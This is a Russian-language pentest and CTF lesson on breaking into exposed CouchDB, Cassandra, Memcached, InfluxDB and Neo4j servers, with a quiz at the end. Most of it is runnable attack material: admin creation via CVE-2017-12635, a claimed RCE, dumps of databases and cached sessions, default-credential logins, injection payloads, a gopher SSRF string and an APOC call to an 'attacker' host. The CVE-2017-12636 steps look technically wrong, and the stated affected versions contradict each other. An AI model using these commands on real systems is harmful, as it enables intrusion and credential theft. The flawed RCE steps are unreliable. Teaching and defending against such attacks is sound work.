---
id: db-other
title: "Другие хранилища: CouchDB, Cassandra, Memcached, Neo4j, InfluxDB"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 4
tags: [couchdb, cassandra, memcached, influxdb, neo4j, cypher, cql, admin-party, datastore]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Практический разбор прочих хранилищ: CouchDB (admin party и RCE через _config), Cassandra (cqlsh, дефолтные креды), Memcached (без аутентификации), InfluxDB, Neo4j (Cypher-инъекция) и общий триаж открытых хранилищ."
---

За пределами MongoDB, Redis и Elasticsearch лежит длинный хвост хранилищ, каждое со своим протоколом и своей историей «открытых по умолчанию» портов. CouchDB годами работала в режиме **admin party** и позволяла выполнять JS на сервере; Cassandra приезжает с парой `cassandra:cassandra`; Memcached вообще не имеет аутентификации и десятилетиями используется как усилитель DDoS; Neo4j даёт графовый язык **Cypher** с классической строковой инъекцией; InfluxDB отдаёт HTTP/JSON и InfluxQL. Этот урок — практический справочник по ним плюс общий алгоритм триажа любого открытого хранилища.

## CouchDB: admin party и RCE через _config

CouchDB слушает **5984** и говорит HTTP/JSON. Корневой запрос выдаёт версию:

```bash
curl -s http://target:5984/
# {"couchdb":"Welcome","version":"3.3.2","vendor":{"name":"The Apache Software Foundation"}}
```

Ключевой режим — **admin party**: если в базе `_users` нет администратора, любой запрос выполняется с админскими правами (любой логин/пароль подходит).

```bash
# список баз (в admin party — без кредов)
curl -s http://target:5984/_all_dbs
# ["_replicator","_users","appdb","logs"]

# дамп документов
curl -s 'http://target:5984/appdb/_all_docs?include_docs=true' | jq '.rows[].doc'

# интерфейс управления
curl -sI http://target:5984/_utils/          # Fauxton
```

RCE исторически достигался через конфиг `query_server_config`/`os_daemons`: вы меняете команду, которую CouchDB исполняет как «query server», на свою.

```bash
# CVE-2017-12635: создание администратора через дублирующийся ключ роли
curl -s -X PUT http://target:5984/_users/org.couchdb.user:attacker \
  -H 'Content-Type: application/json' -d '{
  "type":"user","name":"attacker","roles":["_admin"],"roles":[],"password":"x"
}'

# CVE-2017-12636: RCE через изменение query_server_config
curl -s -X PUT 'http://target:5984/_node/_local/_config/query_server_config/os_process_timeout' -d '"1"'
# подменяем бинарь query-сервера и запускаем
curl -s -X PUT 'http://target:5984/_node/_local/_config/couchdb/os_process_timeout' -d '"bash -c \"id\" > /tmp/pwn"'
```

Проверяйте версию: `CVE-2017-12635/12636` — CouchDB < 1.7.0 / 2.1.1; в свежих версиях admin party закрыт по умолчанию.

## Cassandra: cqlsh, дефолтные креды и CQL

Cassandra слушает **9042** (CQL native), **7000/7001** (gossip). Клиент — `cqlsh`.

```bash
cqlsh target 9042
cqlsh target 9042 -u cassandra -p cassandra     # дефолтная пара
```

Если включён `PasswordAuthenticator`, дефолтный `cassandra:cassandra` часто не меняют. Внутри:

```sql
SELECT release_version FROM system.local;
DESCRIBE keyspaces;
USE appdb;
DESCRIBE tables;
SELECT * FROM appdb.users LIMIT 10;
SELECT keyspace_name, table_name FROM system_schema.tables;
```

Инъекция — обычная **строковая** (CQL похож на SQL): параметр, попадающий в `WHERE ... = '<ввод>'`, ломается кавычкой `'`. Ограничения CQL (нет `UNION` в старом смысле, нет stacked по умолчанию) сужают выбор, но boolean/blind работают.

```sql
-- инъекция в приложение, где параметр конкатенируется
' OR '1'='1
' ALLOW FILTERING --          -- обход требования ALLOW FILTERING
```

Проверка порта и баннера:

```bash
nmap -sV -p 9042,7000,7001 target
```

## Memcached: анонимный дамп и amplification

Memcached слушает **11211** (и UDP 11211) и **не имеет аутентификации вообще** — это часть дизайна. Протокол текстовый.

```bash
# статистика
printf 'stats\r\n' | nc -w3 target 11211 | head
printf 'stats items\r\n' | nc -w3 target 11211
printf 'stats slabs\r\n' | nc -w3 target 11211

# перечисление и чтение ключей
printf 'stats cachedump 1 100\r\n' | nc -w3 target 11211
printf 'get session:abc\r\n' | nc -w3 target 11211
```

Дамп ключей инструментом:

```bash
memcdump --servers=target:11211
memccat --servers=target:11211 session:abc
# сбор всех значений
for k in $(memcdump --servers=target:11211); do
  echo "== $k"; memccat --servers=target:11211 "$k"; echo
done | tee memcached_dump.txt
```

Два риска: **утечка данных** (сессии/токены в кэше) и **amplification DDoS** (UDP-порт с большим `stats`/`get` — усилитель x50k). Memcached также достижим через **SSRF** (текстовые команды по gopher).

## InfluxDB: HTTP API и InfluxQL

InfluxDB (time-series) слушает **8086** и принимает HTTP/JSON.

```bash
curl -s http://target:8086/ping                    # 204 -> жив
curl -s 'http://target:8086/query?q=SHOW+DATABASES'
curl -s 'http://target:8086/query?db=appdb&q=SHOW+MEASUREMENTS'
curl -s 'http://target:8086/query?db=appdb&q=SELECT+*+FROM+users+LIMIT+10'

# v1 с auth (часто выключен)
curl -s -u admin:admin 'http://target:8086/query?q=SHOW+DATABASES'
```

Инъекция — в InfluxQL (похож на SQL): параметр в `WHERE field = '<ввод>'` ломается кавычкой. В InfluxDB 1.x без auth дамп делается напрямую; в 2.x используется токен (`Authorization: Token ...`), который часто утекает из конфигов.

```bash
curl -s -H 'Authorization: Token SECRET' 'http://target:8086/api/v2/query?org=myorg' \
  -H 'Content-Type: application/vnd.flux' -d 'from(bucket:"app")|>range(start:-1d)'
```

## Neo4j: Cypher-инъекция и дефолтные креды

Neo4j — графовая база: **7474** (HTTP/Neo4j Browser), **7687** (Bolt). Дефолтная пара — `neo4j:neo4j` (со сменой при первом входе, но её часто не меняют).

```bash
# проверка HTTP
curl -s http://target:7474/ | head
# вход через API
curl -s -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit \
  -H 'Content-Type: application/json' \
  -d '{"statements":[{"statement":"MATCH (n) RETURN n LIMIT 25"}]}'

# через cypher-shell (Bolt)
cypher-shell -a bolt://target:7687 -u neo4j -p neo4j 'MATCH (n) RETURN count(n)'
```

**Cypher-инъекция.** Neo4j-приложения строят запрос конкатенацией; ломается кавычкой, как в SQL.

```cypher
' OR 1=1 //
' RETURN n // 
' UNION MATCH (u:User) RETURN u.password //
```

Обход: `//` — комментарий в Cypher; `MATCH (n) RETURN n` выгружает весь граф. Полезные запросы:

```cypher
MATCH (u:User) RETURN u.username, u.password LIMIT 50;
MATCH (a)-[r]->(b) RETURN a,r,b LIMIT 100;
CALL db.labels();
CALL db.schema.visualization();
```

## Общий триаж открытых хранилищ

Алгоритм для **любого** неизвестного порта-хранилища:

```bash
# 1. Открыт ли порт и что это
nmap -sV -p 27017,6379,9200,5984,9042,11211,7474,8086,8087,9300,5601,5044 target

# 2. Пробник по протоколу (HTTP -> curl, текстовый -> nc/клиент)
curl -s --max-time 5 http://target:PORT/ | head -c 300
printf 'version\r\n' | nc -w3 target 11211

# 3. Аутентификация есть?
#    - нет -> сразу дамп (это уже находка)
#    - да  -> пробуем дефолтные пары (см. таблицу)

# 4. Фиксируем доказательство: 1-2 строки реальных данных
```

## Сводная таблица: порт, дефолт, эксплуатация

| Хранилище | Порт | Дефолтные креды | Быстрый дамп | RCE |
|-----------|------|-----------------|--------------|:---:|
| CouchDB | 5984 | admin party (нет) | `_all_docs?include_docs=true` | CVE-2017-12636 |
| Cassandra | 9042 | `cassandra:cassandra` | `cqlsh` + `SELECT *` | нет (обычно) |
| Memcached | 11211 | нет аутентификации | `stats cachedump`, `memcdump` | нет |
| InfluxDB | 8086 | часто без auth | `/query?q=SHOW+DATABASES` | нет |
| Neo4j | 7474/7687 | `neo4j:neo4j` | `MATCH (n) RETURN n` | через APOC/плагины |

## Разобранный пример: цепочка по открытым портам

```bash
# Шаг 1. Скан
nmap -sV -p 5984,9042,11211,7474,8086 target

# Шаг 2. CouchDB — admin party
curl -s http://target:5984/_all_dbs
curl -s 'http://target:5984/appdb/_all_docs?include_docs=true' | jq -r '.rows[].doc | select(.password)'

# Шаг 3. Memcached — сессии
printf 'stats items\r\n' | nc -w3 target 11211 | head
memcdump --servers=target:11211 | head

# Шаг 4. Neo4j — дефолтные креды
curl -s -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit \
  -H 'Content-Type: application/json' \
  -d '{"statements":[{"statement":"MATCH (u:User) RETURN u.username,u.password LIMIT 20"}]}' | jq

# Шаг 5. Собираем секреты из всех дампов
grep -riE 'password|token|secret' couch_dump/ neo4j.json memcached_dump.txt | sort -u
```

## Частые ошибки

- **Путать Cassandra с SQL.** CQL похож, но нет `JOIN`, ограничен `ALLOW FILTERING`, stacked-запросы выключены — UNION часто недоступен.
- **Ждать RCE от Memcached.** Там нет исполнения кода; ценность — утечка сессий/токенов и amplification.
- **Забыть про 7474 vs 7687.** Neo4j Browser на 7474 (HTTP), реальный протокол — Bolt 7687; `curl` работает только с 7474.
- **Игнорировать версию CouchDB.** Admin party и RCE — это < 2.x; в новых версиях нужен валидный админ.
- **Считать «пустой» дамп безопасным.** `_all_dbs` может вернуть только системные базы, но в них лежат `_users` с хэшами.
- **Трогать боевые данные.** `DELETE`, `DROP`, `FLUSH` в этих хранилищах разрушительны — только чтение без согласования.

## Полный справочник: команды, пейлоады, примитивы

Развёрнутые таблицы по каждому хранилищу: фингерпринт, клиент, извлечение, запись файлов/RCE, привилегии.

### CouchDB (5984, HTTP/JSON)

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `GET /` | версия и вендор | `curl -s http://target:5984/` → `{"couchdb":"Welcome","version":"3.3.2"}` |
| `_all_dbs` | список баз | `curl -s http://target:5984/_all_dbs` |
| `_all_docs?include_docs=true` | дамп документов | `curl -s 'http://target:5984/appdb/_all_docs?include_docs=true'` |
| `_utils/` | веб-морда Fauxton | `curl -sI http://target:5984/_utils/` |
| `_session` | проверка auth | `curl -s http://target:5984/_session` |
| `_node/_local/_config` | весь конфиг | `curl -s http://target:5984/_node/_local/_config` |
| `_membership` / `_active_tasks` | кластер/задачи | |
| `PUT _users/org.couchdb.user:x` | создать админа (CVE-2017-12635) | `curl -X PUT http://target:5984/_users/org.couchdb.user:attacker -d '{"type":"user","name":"attacker","roles":["_admin"],"roles":[],"password":"x"}'` |
| `PUT _config/query_server_config/...` | RCE через query-server (CVE-2017-12636) | `curl -X PUT 'http://target:5984/_node/_local/_config/query_server_config/os_process_timeout' -d '"1"'` |
| `PUT _config/couchdb/os_process_timeout` | подмена команды-обработчика | `curl -X PUT '.../couchdb/os_process_timeout' -d '"bash -c \"id\" > /tmp/pwn"'` |
| `_users/_all_docs?include_docs=true` | хэши пользователей | `curl -s 'http://target:5984/_users/_all_docs?include_docs=true'` |
| admin party | нет админа → все запросы админские | версия < 2.x |
| `DELETE /db` / `_purge` | **разрушительно** — не без согласования | |

### Cassandra (9042 CQL, 7000/7001 gossip)

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `SELECT release_version FROM system.local` | версия | `cqlsh target 9042 -e 'SELECT release_version FROM system.local'` |
| `cqlsh target 9042` | подключиться | `cqlsh target 9042` |
| `-u cassandra -p cassandra` | дефолтная пара | `cqlsh target 9042 -u cassandra -p cassandra` |
| `-e 'CQL'` | выполнить и выйти | `cqlsh target 9042 -u cassandra -p cassandra -e 'DESCRIBE keyspaces'` |
| `DESCRIBE keyspaces;` | список keyspace | |
| `DESCRIBE tables;` | таблицы | `USE appdb; DESCRIBE tables;` |
| `SELECT keyspace_name,table_name FROM system_schema.tables` | все таблицы | |
| `SELECT * FROM appdb.users LIMIT 10` | дамп | |
| `SELECT * FROM system_auth.roles` | роли + хэши (нужны права) | |
| `' OR '1'='1` | строковая инъекция | параметр в `WHERE x = '<ввод>'` |
| `' ALLOW FILTERING --` | обход требования `ALLOW FILTERING` | |
| `nodetool status` / `nodetool tablestats` | состояние/статистика | `nodetool -h target status` |
| `nmap -sV -p 9042,7000,7001` | фингерпринт | |
| `SELECT * FROM system.peers` | топология | |

### Memcached (11211 TCP/UDP, текстовый протокол)

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `stats` | версия, соединения, хиты | `printf 'stats\r\n' \| nc -w3 target 11211` |
| `stats items` | slab-классы с ключами | `printf 'stats items\r\n' \| nc -w3 target 11211` |
| `stats slabs` | slab-статистика | |
| `stats cachedump <slab> <n>` | список ключей slab'а | `printf 'stats cachedump 1 100\r\n' \| nc -w3 target 11211` |
| `lru_crawler metadump all` | все ключи (новые версии) | `printf 'lru_crawler metadump all\r\n' \| nc -w3 target 11211` |
| `get <key>` | прочитать значение | `printf 'get session:abc\r\n' \| nc -w3 target 11211` |
| `set` / `add` / `delete` | **изменяют** данные | `printf 'set k 0 0 3\r\nabc\r\n' \| nc target 11211` |
| `version` | версия (ASCII-протокол) | `printf 'version\r\n' \| nc -w3 target 11211` |
| `memcdump --servers=target:11211` | выгрузить все ключи | |
| `memccat --servers=target:11211 k` | значение ключа | `memccat --servers=target:11211 session:abc` |
| `memcstat --servers=target:11211` | статистика | |
| `nmap -sU -p 11211` | UDP-порт (amplification) | |
| SSRF | текстовые команды по gopher | `gopher://127.0.0.1:11211/_stats%0d%0A` |
| Привилегии | **нет аутентификации вообще** | любой видит порт = читает данные |

### InfluxDB (8086 HTTP, InfluxQL/Flux)

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `GET /ping` | живость (204) | `curl -s http://target:8086/ping` |
| `/query?q=SHOW DATABASES` | список баз | `curl -s 'http://target:8086/query?q=SHOW+DATABASES'` |
| `/query?db=x&q=SHOW MEASUREMENTS` | измерения | `curl -s 'http://target:8086/query?db=appdb&q=SHOW+MEASUREMENTS'` |
| `/query?db=x&q=SELECT * FROM users LIMIT 10` | дамп | |
| `-u admin:admin` | basic-auth (v1) | `curl -s -u admin:admin 'http://target:8086/query?q=SHOW+DATABASES'` |
| `/api/v2/query?org=x` | запрос Flux (v2) | `curl -H 'Authorization: Token SECRET' '.../api/v2/query?org=myorg' -d 'from(bucket:"app")'` |
| `SHOW RETENTION POLICIES` | политики хранения | |
| `SHOW USERS` / `SHOW GRANTS FOR u` | пользователи/права | `curl -s '.../query?q=SHOW+USERS'` |
| `' OR '1'='1` | инъекция в InfluxQL | параметр в `WHERE field = '<ввод>'` |
| `SELECT ... INTO <measurement>` | запись в измерение | |
| `/debug/vars` | метрики/конфиг | `curl -s http://target:8086/debug/vars` |
| RCE | напрямую нет | используйте утечку токена → доступ к данным |

### Neo4j (7474 HTTP, 7687 Bolt)

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `GET /` | версия/признак | `curl -s http://target:7474/` |
| `/db/neo4j/tx/commit` | выполнить Cypher по HTTP | `curl -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit -d '{"statements":[{"statement":"MATCH (n) RETURN n LIMIT 25"}]}'` |
| `cypher-shell -a bolt://host:7687` | подключиться по Bolt | `cypher-shell -a bolt://target:7687 -u neo4j -p neo4j` |
| `-u neo4j -p neo4j` | дефолтная пара | |
| `MATCH (n) RETURN n` | дамп всего графа | `cypher-shell ... 'MATCH (n) RETURN n LIMIT 100'` |
| `CALL db.labels()` | метки узлов | |
| `CALL db.schema.visualization()` | схема | |
| `MATCH (u:User) RETURN u.username,u.password` | креды | |
| `' OR 1=1 //` | Cypher-инъекция | параметр в `MATCH (u:User {name:'<ввод>'})` |
| `' RETURN n //` | завершить запрос | |
| `' UNION MATCH (u:User) RETURN u.password //` | расширить выборку | |
| `CALL dbms.security.listUsers()` | пользователи БД | |
| `CALL apoc.load.json('http://attacker/')` | SSRF/чтение URL (APOC) | |
| `CALL apoc.export.csv.all('/tmp/out.csv',{})` | запись файла (APOC) | |
| `CALL dbms.procedures()` | список процедур | |
| `SHOW USERS` | пользователи (4.x) | |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какой режим CouchDB позволяет выполнять запросы без аутентификации, если админ не создан?"
  options:
    - "read-only"
    - "admin party"
    - "trust mode"
    - "open session"
  answer: 1
  explanation: "Без записи администратора в _users любой запрос считается админским — это admin party."
- question: "Какие дефолтные креды у Cassandra?"
  options:
    - "admin:admin"
    - "cassandra:cassandra"
    - "neo4j:neo4j"
    - "root:root"
  answer: 1
  explanation: "PasswordAuthenticator по умолчанию заводит пользователя cassandra с паролем cassandra."
- question: "Какая особенность Memcached делает его опасным сетевым сервисом?"
  options:
    - "Полное отсутствие аутентификации"
    - "Наличие SQL-инъекции"
    - "Исполнение JavaScript"
    - "Хранение файлов на диске"
  answer: 0
  explanation: "Memcached не имеет аутентификации вообще — любой, кто видит порт, читает данные."
- question: "На каком языке запросов работает Neo4j?"
  options:
    - "CQL"
    - "InfluxQL"
    - "Cypher"
    - "painless"
  answer: 2
  explanation: "Cypher — графовый язык Neo4j; инъекция в него ломается кавычкой и // (комментарий)."
- question: "Какой порт по умолчанию у HTTP-API InfluxDB?"
  options:
    - "8086"
    - "9200"
    - "11211"
    - "7474"
  answer: 0
  explanation: "InfluxDB слушает 8086 и принимает InfluxQL через /query."
```

## Где пригодится

- **CTF (Web):** «прочие хранилища» всплывают в задачах на открытые порты; CouchDB admin party и Memcached — быстрые флаги.
- **Bug bounty:** открытый Memcached/CouchDB/Neo4j — critical; дефолтные креды Cassandra/Neo4j — частая находка.
- **Пентест:** общий триаж портов хранилищ экономит время на каждом внешнем скане.
- **Работа (AppSec):** знание дефолтных кред и опасных режимов ложится в чек-лист hardening и мониторинга.
